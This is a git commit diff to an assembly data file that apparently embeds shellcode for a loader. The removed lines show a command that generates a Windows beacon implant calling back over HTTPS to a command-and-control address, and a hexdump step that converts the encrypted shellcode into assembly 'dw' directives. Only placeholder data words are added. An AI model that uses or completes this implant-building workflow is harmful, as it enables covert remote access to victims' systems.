8b5fd5292d4c07c1bcc3b0e4d706fdebd2fa1e83
JD <labgeek@users.noreply.github.com>
2023-05-15 18:37:14 -0400

    Update data.asm

--- data.asm
+++ data.asm
@@ -1,8 +1,13 @@
 .CODE
 RunData PROC
 
-generate beacon --seconds 5 --jitter 3 --os windows -a amd64 --format shellcode -b https://172.x.x.x:443 --name httpsBeacon --save /tmp/https50.bin -G --skip-symbols
-<hexdump -v -e '1/2 "dw 0%.4xh\n"' https50.bin.enc| tee out.txt>
+...
+dw 0f0bch
+dw 0b6b6h
+dw 0bc8ah
+dw 01844h
+...
+
 
 RunData ENDP
 END
